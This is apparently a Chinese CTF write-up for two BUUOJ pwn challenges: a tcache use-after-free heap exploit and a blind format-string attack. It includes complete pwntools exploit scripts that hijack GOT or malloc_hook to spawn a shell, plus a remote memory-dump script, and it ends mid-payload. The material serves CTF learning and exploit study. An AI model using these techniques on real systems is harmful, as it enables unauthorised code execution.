&lt;vfprintf+143&gt;    mov    qword ptr [rbp - 0x438], rax  0x7f68f5221426 &lt;vfprintf+150&gt;    movups xmmword ptr [rbp - 0x448], xmm0► 0x7f68f522142d &lt;vfprintf+157&gt;    call   *ABS*+0xa07f0@plt &lt;0x7f68f51e7040&gt;       rdi: 0x55d549dc2ff6 ◂— imul   esp, dword ptr [rax + rdi*2 + 0x3f], 0x6e6f6300 /* &#x27;idx?&#x27; */       rsi: 0x25       rdx: 0x7ffe06e5d790 ◂— 0x3000000008       rcx: 0x0\n\n反编译ABS+0xa07f0@plt &lt;0x7f68f51e7040&gt;,获取类似与储存地址的got表地址.0x7f68f55b1048\npwndbg&gt; disass 0x7f68f51e7040Dump of assembler code for function *ABS*+0xa07f0@plt:   0x00007f68f51e7040 &lt;+0&gt;:\tjmp    QWORD PTR [rip+0x3ca002]        # 0x7f68f55b1048   0x00007f68f51e7046 &lt;+6&gt;:\tpush   0x28   0x00007f68f51e704b &lt;+11&gt;:\tjmp    0x7f68f51e6fd0End of assembler dump.pwndbg&gt; x /40gx 0x7f68f55b1048 # 修改里面的地址为one_gadget就行.0x7f68f55b1048:\t0x00007f68f5277120\t0x00007f68f5345c800x7f68f55b1058:\t0x00007f68f51e7066\t0x00007f68f53474900x7f68f55b1088:\t0x00007f68f5271970\t0x00007f68f5350f900x7f68f55b1098:\t0x00007f68f5271ea0\t0x00007f68f55d0250...  ...pwndbg&gt; x /10gx 0x00007f68f52771200x7f68f5277120 &lt;__strchrnul_sse2&gt;:\t0xff25f889ce6e0f66\t0x3dc9600f6600000f0x7f68f5277130 &lt;__strchrnul_sse2+16&gt;:\t0xc9610f6600000fc0\t0x4d8f0f00c9700f660x7f68f5277140 &lt;__strchrnul_sse2+32&gt;:\t0x66076f0ff3000001\t0x66e06f0f66dbef0f0x7f68f5277150 &lt;__strchrnul_sse2+48&gt;:\t0x66e3740f66c1740f\t0x85c0d70f66c4eb0f0x7f68f5277160 &lt;__strchrnul_sse2+64&gt;:\t0x8d48c0bc0f0d74c0\t0x0000441f0fc30704pwndbg&gt;\n\nexp-2#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;vn_pwn_easyTHeap&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;remoteIp = &quot;node3.buuoj.cn&quot;remotePort = 28200LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(size):\tsla(&#x27;choice: &#x27;, str(1))\tsla(&#x27;?&#x27;, str(size))def rm(idx):\tsla(&#x27;choice: &#x27;, str(4))\tsla(&#x27;?&#x27;, str(idx))def md(idx, data):\tsla(&#x27;choice: &#x27;, str(2))\tsla(&#x27;?&#x27;, str(idx))\tsa(&#x27;:&#x27;, data)def dp(idx):\tsla(&#x27;choice: &#x27;, str(3))\tsla(&#x27;?&#x27;, str(idx))def q():\tsla(&#x27;choice: &#x27;, str(5))\t#--------------------------Exploit--------------------------def exploit():\tad(0x100) #idx 0\tad(0x100) #idx 1\trm(0)\trm(0)\t# leak heap addr\tdp(0)\theap_base = u64(ru(&#x27;\\n&#x27;) + &#x27;\\x00\\x00&#x27;) - 0x260\tli(&#x27;heap_base &#x27; + hex(heap_base))\tad(0x100) # 2 for ajust\tad(0x100) # 3\tad(0x100) # 4 teache count as -1, so free chunk will not be teache bin\trm(0)\t# leak libc\tdp(0)\tlib.address = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;) - 96 - 0x3ebc40\tli(&#x27;libc base &#x27; + hex(lib.address))\tABS = lib.address + (0x7fd855098048 - 0x7fd854cad000)\tgadget = [0x4f2c5, 0x4f322, 0xe569f, 0xe5858, 0xe585f, 0xef863, 0x10a38c, 0x10a398]\tone_gadget = lib.address + gadget[1]\t# can&#x27;t malloc only to modify _IO_2_1_stdout vtable\tmd(3, p64(ABS))\tad(0x100) # idx 5 for ajust\tli(&#x27;ABS_got &#x27; + hex(ABS))\tad(0x100) # idx 6, malloc to our addr\tp = p64(one_gadget)\t#db()\tmd(6, p)def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()&#x27;&#x27;&#x27;0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  rsp &amp; 0xf == 0  rcx == NULL0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  [rsp+0x40] == NULL0xe569f execve(&quot;/bin/sh&quot;, r14, r12)constraints:  [r14] == NULL || r14 == NULL  [r12] == NULL || r12 == NULL0xe5858 execve(&quot;/bin/sh&quot;, [rbp-0x88], [rbp-0x70])constraints:  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL0xe585f execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])constraints:  [r10] == NULL || r10 == NULL  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL0xe5863 execve(&quot;/bin/sh&quot;, r10, rdx)constraints:  [r10] == NULL || r10 == NULL  [rdx] == NULL || rdx == NULL0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL0x10a398 execve(&quot;/bin/sh&quot;, rsi, [rax])constraints:  [rsi] == NULL || rsi == NULL  [[rax]] == NULL || [rax] == NULL&#x27;&#x27;&#x27;\n\n\n\n打法3评估: \n复杂度: 一般  成功率: 高\n上面那个两个都没有控制好malloc的次数,多了一个,这个就控制少了一个,所以直接修改realloc_hook和malloc_hook打one_gadget.\n知识点tcache管理机制\n思路程序中限制了malloc 和 free 的次数, 存在明显的uaf漏洞, 但是可以首先利用Tcache dup泄露heap 地址,且也使该方法打入tcache 管理头部,也就是堆的头部,修改tcahe的数量为7,在释放堆块的时候就不会由tcache bin来管理.这样可以泄漏libc,再次修改该结构,使bin指向malloc - 8处,下次分配直接修改该地址,realloc调参数打one_gadget\nexp-3#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;vn_pwn_easyTHeap&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;remoteIp = &quot;node3.buuoj.cn&quot;remotePort = 28200LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(size):\tsla(&#x27;choice: &#x27;, str(1))\tsla(&#x27;?&#x27;, str(size))def rm(idx):\tsla(&#x27;choice: &#x27;, str(4))\tsla(&#x27;?&#x27;, str(idx))def md(idx, data):\tsla(&#x27;choice: &#x27;, str(2))\tsla(&#x27;?&#x27;, str(idx))\tsa(&#x27;:&#x27;, data)def dp(idx):\tsla(&#x27;choice: &#x27;, str(3))\tsla(&#x27;?&#x27;, str(idx))def q():\tsla(&#x27;choice: &#x27;, str(5))\t#--------------------------Exploit--------------------------def exploit():\tad(0x100) #idx 0\tad(0x100) #idx 1\trm(0)\trm(0)\t# leak heap addr\tdp(0)\theap_base = u64(ru(&#x27;\\n&#x27;) + &#x27;\\x00\\x00&#x27;) - 0x260\tli(&#x27;heap_base &#x27; + hex(heap_base))\tad(0x100) #ixx 2\tmd(2, p64(heap_base + 0x10)) #modify as heap base\tad(0x100) #idx 3\tad(0x100) #idx 4\tp = p64(0x0)\tp +=p64(0x0700000000000000) # set as max num so free not as tcache bin\tmd(4, p)\trm(0)\t#leak libc\tdp(0)\tlib.address = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;) - 96 - 0x3ebc40\tli(&#x27;libc base &#x27; + hex(lib.address))\tgadget = [0x4f2c5, 0x4f322, 0xe569f, 0xe5858, 0xe585f, 0xef863, 0x10a38c, 0x10a398]\tone_gadget = lib.address + gadget[1]\tp = p64(0x0)\tp +=p64(0x0700000000000000) # set as max num so free not as tcache bin\tp = p.ljust(0xB8, &#x27;\\x00&#x27;)\tp += p64(lib.sym[&#x27;__malloc_hook&#x27;] - 8)\tmd(4, p)\tad(0x100) #idx 5\tp = p64(one_gadget)\tp += p64(lib.sym[&#x27;realloc&#x27;] + 8)\tmd(5, p)\t#get shell\t#db()\tad(0x1)\t## can&#x27;t malloc only to modify _IO_2_1_stdout vtabledef finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()&#x27;&#x27;&#x27;0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  rsp &amp; 0xf == 0  rcx == NULL0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  [rsp+0x40] == NULL0xe569f execve(&quot;/bin/sh&quot;, r14, r12)constraints:  [r14] == NULL || r14 == NULL  [r12] == NULL || r12 == NULL0xe5858 execve(&quot;/bin/sh&quot;, [rbp-0x88], [rbp-0x70])constraints:  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL0xe585f execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])constraints:  [r10] == NULL || r10 == NULL  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL0xe5863 execve(&quot;/bin/sh&quot;, r10, rdx)constraints:  [r10] == NULL || r10 == NULL  [rdx] == NULL || rdx == NULL0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL0x10a398 execve(&quot;/bin/sh&quot;, rsi, [rax])constraints:  [rsi] == NULL || rsi == NULL  [[rax]] == NULL || [rax] == NULL&#x27;&#x27;&#x27;\n\n\n\nAXB_2019_fmt来源AXB_2019\n难度4&#x2F; 10\n简单描述不给elf文件, 盲打.\nvullogan@LYXF:~/share/axb_fmt1$ nc node3.buuoj.cn 29458Hello,I am a computer Repeater updated.After a lot of machine learning,I know that the essence of man is a reread machine!So I&#x27;ll answer whatever you say!Please tell me:%p %pRepeater:0x804888d 0xffde142fPlease tell me:^c\n\n存在字符串漏洞, 输出4bytes的地址, 这是一个32位程序\n知识点fmt vul的各种利用, fmt vul dump文件, fmt vul修改内存.\n思路先使用脚本算出偏移,然后编写dump脚本, 这是一个32 bit的程序,就从0x08048000开始dump内存然后写入本地文件中, 后面就简单得多了, 分析所dump的文件,发现strlen对字符串的长度进行判断, 采用字符串漏洞泄漏libc,随便找一个函数都行,计算偏移,然后再获取system函数, 修改strlen的got地址为system,再输入时输入’;&#x2F;bin&#x2F;sh’就行, 注意,因为strlen传入的时候, Repeater:也跟着传入, 在linux bash中以’; ‘来进行分割命令,所以相当于执行两次命令, 一个Repeater:和一个&#x2F;bin&#x2F;sh.\n利用计算偏移这个是我自己写的一个跑偏移脚本, 十分方便,用手数…^_^\n#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0gan# Team  : D0g3from pwn import *context.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#exeFile  = &quot;./4th-CyberEarth&quot;remoteIp = &quot;node3.buuoj.cn&quot;remotePort = 29619LOCAL = 0maxLen = 0x30minLen = 0x10preSendStr = &#x27;&#x27;recvStr = &#x27;&#x27;r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()pd32  = lambda x : p32(x).decode() #python3 not surport str + bytespd64  = lambda x : p64(x).decode()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)def calc(payload):\tif(preSendStr == &#x27;&#x27;):\t\tsl(payload)\telse:\t\tsla(preSendStr, payload)\tif(recvStr != &#x27;&#x27;):\t\tru(recvStr)\trecv = ra()\tinfos = recv.split(&#x27;, &#x27;)\toffset = -1\tfor info in infos:\t\tli(info)\t\toffset += 1\t\tif(&#x27;0x44434241&#x27; == info):\t\t\treturn offset\t\t#pause()\treturn -1#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tlength = 0;\tpayload = &#x27;ABCD&#x27; + &#x27;, %p&#x27; * minLen\twhile(True):\t\tif LOCAL:\t\t\tio = process(exeFile)\t\t\telse:\t\t\tio = remote(remoteIp, remotePort)\t\toffset = calc(payload) \t\tif(-1 != offset):\t\t\tli(&#x27;---------------------------------------------&#x27;)\t\t\tli(&#x27;\\noffset:&#x27; + str(offset))\t\t\t\tio.close()\t\t\tbreak\t\tio.close()\t\tpayload += &#x27;, %p&#x27;\t\t\tlength += 1\t\tif(length &gt; maxLen):\t\t\tli(&#x27;---------------------------------------------&#x27;)\t\t\tli(&#x27;not found! maxLen too litile&#x27;)\t\t\tio.close\t\t\tbreak\n\n跑的操作如下\nlogan@LYXF:~/share/axb_fmt1$ python calc_fmt_offset.py [+] Opening connection to node3.buuoj.cn on port 29458: Done[DEBUG] Sent 0x45 bytes:    &#x27;ABCD, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p\\n&#x27;[-] Receiving all data: Failed[DEBUG] Received 0x7b bytes:    &#x27;Hello,I am a computer Repeater updated.\\n&#x27;    &#x27;After a lot of machine learning,I know that the essence of man is a reread machine!&#x27;[DEBUG] Received 0x31 bytes:    &#x27;\\n&#x27;    &quot;So I&#x27;ll answer whatever you say!\\n&quot;    &#x27;Please tell me:&#x27;[DEBUG] Received 0xc8 bytes:    &#x27;Repeater:ABCD, 0x804888d, 0xffe54d3f, 0xf7f5a53c, 0xffe54d48, 0xf7f365c5, 0x4f, 0x41e54e34, 0x2c444342, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520\\n&#x27;    &#x27;\\n&#x27;\n\n通过手数, 差一个字节偏移就为8 (0x41e54e34, 0x2c444342), 后面再利用的时候就要得补一字节对其.\n编写dump脚本利用 printf 中的 %s来进行dump, ‘%’ + str(offset + x) + ‘$s’ + p32(target_addr)来调整所dump的参数位置, 这就可以dump出任何内存的值了, 我们知道, linux32位程序,若没有开启pie的话,elf文件就加载到0x08048000起始位置, linux 64位程序就加载到0x400000位置, 所以我们就从0x08048000位置开始dump, 注意 dump出来的数据是以’\\x00’结尾的, 每一条数据后面都要加一条‘\\x00’,dump为空的也数据也就为 ‘\\x00’,循环dump数据,写入文件, 我也是第一次写dump文件,照着ctf-wiki中那个方法, dump感觉太慢了,每次都要重新连接,而这个体是循环输入的,不用每次dump都重新连接,还有,dump的时候,无误了,尽量把IO输出给删了, 极大影响dump的速率,尽最大的关掉, 还有在打远程的时候总是容易断开,如下:\n[*] dumping: 1660/12288[*] dumping: 2010/12288[*] dumping: 2140/12288[*] dumping: 2270/12288[*] dumping: 2280/12288[*] dumping: 2310/12288[*] dumping: 2320/12288[*] dumping: 2380/12288[*] dumping: 2390/12288[*] dumping: 2460/12288[*] Error.\n\n这就导致dump的数据太少了, 我就改进了一下,添加一个重新连接,继续dump.改进后如下:\n[*] dumping: 2540/12288[*] Closed connection to node3.buuoj.cn port 29458[*] Error.[+] Opening connection to node3.buuoj.cn on port 29458: Done[*] dumping: 2550/12288[*] dumping: 2560/12288\n\ndump 文件脚本#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0gan&#x27;&#x27;&#x27;This is a dump file script&#x27;&#x27;&#x27;from pwn import *#context.log_level=&#x27;debug&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;remoteIp = &quot;node3.buuoj.cn&quot;remotePort = 29458LOCAL = 1LIB   = 0#--------------------------Exploit--------------------------offset = 8 + 2 + 2def getbinary():\tdata_length = 0x3000 #想要获取数据的长度.\tbase_addr = 0x08048000 # 起始地址\tend_addr  = base_addr + data_length # 结束地址\tf = open(&#x27;binary&#x27;, &#x27;w&#x27;)\taddr = base_addr\tisDisConnect = False\tdisConnectMaxTimes = 3 #这里可以设定一个最大断开连接次数,网络差就调大一点\tio = remote(remoteIp, remotePort)\tfor i in range(disConnectMaxTimes):\t\tio.recvuntil(&#x27;Please tell me:&#x27;)\t\twhile addr &lt; end_addr:\t\t\ttry:\t\t\t\tp = &#x27;ABCDE&#x27; #随便一些自己规定的字符,从这里开始读取数据\t\t\t\tp += &#x27;%&#x27; + str(offset)\t\t\t\tp += &#x27;$s&#x27;\t\t\t\tp += &#x27;CBAABCD&#x27; #随便一些自己规定的字符,方便结尾,中间的数据就是dump的数据了\t\t\t\tp += p32(addr)\t\t\t\tio.send(p)\t\t\t\tio.recvuntil(&#x27;ABCDE&#x27;, drop = True)\t\t\t\tdata = io.recvuntil(&#x27;CBAABCD&#x27;, drop = True)\t\t\t\t#print data\t\t\texcept EOFError: #读有错误的话,就断开重新连接\t\t\t\tisDisconnect = True\t\t\t\tio.close()\t\t\t\tbreak\t\t\t\tif len(data) == 0: #为0的话,说明读到的值为0,就没有输出,但数据还是要的补上\t\t\t\tf.write(&#x27;\\x00&#x27;)\t\t\t\taddr += 1\t\t\telse:\t\t\t\tdata += &#x27;\\x00&#x27; # 注意字符串结尾是&#x27;\\x00&#x27;是不会打印的,要得补上\t\t\t\tf.write(data)\t\t\t\taddr += len(data)\t\t\tif(((addr - base_addr) % 10) == 0): #这里就是输出的进度了.\t\t\t\tprint(&#x27;dumping: &#x27; + str(addr - base_addr) + &#x27;/&#x27; + str(data_length))\t\tif isDisconnect == True: #断开重新连接.\t\t\tprint(&#x27;Error.&#x27;)\t\t\tio = remote(remoteIp, remotePort)\t\t\tisDisconnect = False\t\t\tsleep(0.5)\t\tf.close()\tio.close()def exploit():\tgetbinary()\t#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\texploit()\n\n然后就静静的等待,若开启输出太多加上是远程dump,可能一个小时都还没dump 10k,尽量关掉输出.\ndump文件之后如下:\nlogan@LYXF:~/share/axb_fmt1$ cat binaryELF�4`4 \t(44�4�  TT�T����\t�\t�4d����hh�h�DDP�td����,,Q�tdR�... ...\n\nIDA分析dump的文件所dump的文件不能反编译为c语言伪代码,只能看汇编.\n_init_proc\tLOAD\t08048418\t00000023\t0000000C\t00000000\tR\t.\t.\t.\t.\t.\t.sub_8048450\tLOAD\t08048450\t00000006\t\t\tR\t.\t.\t.\t.\t.\t.sub_8048460\tLOAD\t08048460\t00000006\t\t\tR\t.\t.\t.\t.\t.\t.sub_8048470\tLOAD\t08048470\t00000006\t\t\tR\t.\t.\t.\t.\t.\t.j_start\tLOAD\t08048480\t00000006\t\t\t.\t.\t.\t.\t.\t.\t.sub_8048490\tLOAD\t08048490\t00000006\t\t\tR\t.\t.\t.\t.\t.\t.sub_80484A0\tLOAD\t080484A0\t00000006\t\t\tR\t.\t.\t.\t.\t.\t.sub_80484B0\tLOAD\t080484B0\t00000006\t\t\tR\t.\t.\t.\t.\t.\t.sub_80484C0\tLOAD\t080484C0\t00000006\t\t\tR\t.\t.\t.\t.\t.\t.sub_80484D0\tLOAD\t080484D0\t00000006\t\t\tR\t.\t.\t.\t.\t.\t.sub_80484E0\tLOAD\t080484E0\t00000006\t\t\tR\t.\t.\t.\t.\t.\t.__gmon_start__\tLOAD\t080484F0\t00000006\t\t\tR\t.\t.\t.\t.\t.\t.start\tLOAD\t08048500\t00000022\t\t\t.\t.\t.\t.\t.\t.\t.sub_8048530\tLOAD\t08048530\t00000004\t00000000\t00000000\tR\t.\t.\t.\t.\t.\t.sub_8048540\tLOAD\t08048540\t0000002B\t00000000\t00000000\tR\t.\t.\t.\t.\t.\t.sub_80485B0\tLOAD\t080485B0\t0000001E\t00000000\t00000000\tR\t.\t.\t.\t.\t.\t.sub_80485D0\tLOAD\t080485D0\t0000002B\t\t\tR\t.\t.\t.\t.\t.\t.sub_8048760\tLOAD\t08048760\t0000005D\t00000010\t0000000C\tR\t.\t.\t.\t.\t.\t.nullsub_1\tLOAD\t080487C0\t00000002\t00000000\t00000000\tR\t.\t.\t.\t.\t.\t._term_proc\tLOAD\t080487C4\t00000014\t0000000C\t00000000\tR\t.\t.\t.\t.\t.\t.\n\n也可以看到,基本的函数也出来了, 但没有发现main函数,找相关逻辑代码吧\nLOAD:080486AD                 lea     eax, [ebp-138h]LOAD:080486B3                 push    eaxLOAD:080486B4                 call    sub_80484D0LOAD:080486B9                 add     esp, 10hLOAD:080486BC                 sub     esp, 0ChLOAD:080486BF                 push    offset aPleaseTellMe ; &quot;Please tell me:&quot;LOAD:080486C4                 call    sub_8048470     LOAD:080486C9                 add     esp, 10hLOAD:080486CC                 sub     esp, 4LOAD:080486CF                 push    100hLOAD:080486D4                 lea     eax, [ebp-239h]LOAD:080486DA                 push    eaxLOAD:080486DB                 push    0LOAD:080486DD                 call    sub_8048460     LOAD:080486E2                 add     esp, 10hLOAD:080486E5                 sub     esp, 4LOAD:080486E8                 lea     eax, [ebp-239h]LOAD:080486EE                 push    eaxLOAD:080486EF                 push    offset aRepeaterS ; &quot;Repeater:%s\\n&quot;LOAD:080486F4                 lea     eax, [ebp-138h]LOAD:080486FA                 push    eaxLOAD:080486FB                 call    sub_80484E0     LOAD:08048700                 add     esp, 10hLOAD:08048703                 sub     esp, 0ChLOAD:08048706                 lea     eax, [ebp-138h]LOAD:0804870C                 push    eaxLOAD:0804870D                 call    sub_80484B0     LOAD:08048712                 add     esp, 10hLOAD:08048715                 mov     [ebp-240h], eax LOAD:0804871B                 cmp     dword ptr [ebp-240h], 10Eh ; compare length with 10ELOAD:08048725                 jbe     short loc_8048741LOAD:08048727                 sub     esp, 0ChLOAD:0804872A                 push    offset aWhatYouInputIs ; &quot;what you input is really long!&quot;LOAD:0804872F                 call    sub_8048470LOAD:08048734                 add     esp, 10hLOAD:08048737                 sub     esp, 0ChLOAD:0804873A                 push    0LOAD:0804873C                 call    sub_80484A0\n\n虽然找到,但不知道调用什么函数, 需要去看看符号表.\nextern:0804A06C ; externextern:0804A06C ; void setbuf(FILE *stream, char *buf)extern:0804A06C                 extrn setbuf:nearextern:0804A070 ; ssize_t read(int fd, void *buf, size_t nbytes)extern:0804A070                 extrn read:nearextern:0804A074 ; int printf(const char *format, ...)extern:0804A074                 extrn printf:nearextern:0804A078 ; unsigned int alarm(unsigned int seconds)extern:0804A078                 extrn alarm:nearextern:0804A07C ; int puts(const char *s)extern:0804A07C                 extrn puts:nearextern:0804A080 ; void exit(int status)extern:0804A080                 extrn exit:nearextern:0804A084 ; size_t strlen(const char *s)extern:0804A084                 extrn strlen:nearextern:0804A088 ; int __cdecl _libc_start_main(int (__cdecl *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end)extern:0804A088                 extrn __libc_start_main:nearextern:0804A08C ; void *memset(void *s, int c, size_t n)extern:0804A08C                 extrn memset:nearextern:0804A090 ; int sprintf(char *s, const char *format, ...)extern:0804A090                 extrn sprintf:nearextern:0804A094                 extrn __imp___gmon_start__:near ; weakextern:0804A094                                         ; CODE XREF: __gmon_start__↑j\n\n这就需要推断调用什么函数了.\nLOAD:080486AD                 lea     eax, [ebp-138h]LOAD:080486B3                 push    eaxLOAD:080486B4                 call    sub_80484D0LOAD:080486B9                 add     esp, 10hLOAD:080486BC                 sub     esp, 0ChLOAD:080486BF                 push    offset aPleaseTellMe ; &quot;Please tell me:&quot;LOAD:080486C4                 call    sub_8048470   // puts函数LOAD:080486C9                 add     esp, 10hLOAD:080486CC                 sub     esp, 4LOAD:080486CF                 push    100h // lengthLOAD:080486D4                 lea     eax, [ebp-239h]LOAD:080486DA                 push    eax  // bufLOAD:080486DB                 push    0    //fdLOAD:080486DD                 call    sub_8048460     //read 函数LOAD:080486E2                 add     esp, 10hLOAD:080486E5                 sub     esp, 4LOAD:080486E8                 lea     eax, [ebp-239h]LOAD:080486EE                 push    eax // bufLOAD:080486EF                 push    offset aRepeaterS ; &quot;Repeater:%s\\n&quot; //arg 2LOAD:080486F4                 lea     eax, [ebp-138h]LOAD:080486FA                 push    eax  //buf2LOAD:080486FB                 call    sub_80484E0  //sprintf函数   LOAD:08048700                 add     esp, 10hLOAD:08048703                 sub     esp, 0ChLOAD:08048706                 lea     eax, [ebp-138h] LOAD:0804870C                 push    eax //buf2LOAD:0804870D                 call    sub_80484B0      / /strlen函数,传入buf2LOAD:08048712                 add     esp, 10hLOAD:08048715                 mov     [ebp-240h], eax ; //srlen函数的返回值 LOAD:0804871B                 cmp     dword ptr [ebp-240h], 10Eh ; compare length with 10ELOAD:08048725                 jbe     short loc_8048741LOAD:08048727                 sub     esp, 0ChLOAD:0804872A                 push    offset aWhatYouInputIs ; &quot;what you input is really long!&quot;LOAD:0804872F                 call    sub_8048470LOAD:08048734                 add     esp, 10hLOAD:08048737                 sub     esp, 0ChLOAD:0804873A                 push    0LOAD:0804873C                 call    sub_80484A0\n\nleak libc泄漏libc的话,只需泄漏某个函数的got表,就选择sprintf来泄漏吧, 点击sprintf的call sub_80484E0进入plt跳转.\nLOAD:080484E0 sub_80484E0     proc near               ; CODE XREF: LOAD:080486FB↓pLOAD:080484E0                 jmp     ds:dword_804A030LOAD:080484E0 sub_80484E0     endp\n\n点击jmp到sprintf got 表地址\nLOAD:0804A030 dword_804A030   dd 1C001Fh              ; DATA XREF: sub_80484E0↑r\n\n0x0804A030就是sprintf的got表地址了,那么我们就可以通过字符串漏洞泄漏该地址的内容,从而获取到libc中sprintf的地址,strlen也是同样的方法.\nsprintf_got = 0x0804A030\tstrlen_got = 0x0804A024offset = 8# leak libcp = &#x27;A&#x27; # for alignmentp += &#x27;%&#x27; + str(offset + 1) + &#x27;$s&#x27; + p32(sprintf_got)s(p)sprintf = u32(ru(&#x27;\\xf7&#x27;)[-3:] + &#x27;\\xf7&#x27;)li(&#x27;sprintf &#x27; + hex(sprintf))&#x27;&#x27;&#x27;select:2: ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)&#x27;&#x27;&#x27;libc = LibcSearcher(&#x27;sprintf&#x27;, sprintf)libc_base = sprintf - libc.dump(&#x27;sprintf&#x27;)li(&#x27;libc_base &#x27; + hex(libc_base))system = libc_base + libc.dump(&#x27;system&#x27;)li(&#x27;system &#x27; + hex(system))\n\n修改strlen的got表内容为system使用字符串漏洞来进行地址写入, 使用’$hn’s 2字节分两次写入,先写小的再写大的, system的高位地址要比system的低位地址大,则先写小的.\nhigh_sys = system &gt;&gt; (8 * 2) #获取高4位low_sys = system &amp; 0xFFFF    #获取低4位li(&#x27;high_sys &#x27; + hex(high_sys))li(&#x27;low_sys  &#x27; + hex(low_sys))# modify strlen gotpre_len = len(&#x27;Repeater:&#x27;) + 1 + 4 + 4 #这里为数据已经打印的长度,后面写入长度需要减掉该长度p = &#x27;A&#x27; # for alignmentp += p32(strlen_got + 0) # 8p += p32(strlen_got + 2) # 9p += &#x27;%&#x27; + str(low_sys - pre_len) + &#x27;c%&#x27; + str(offset + 0) + 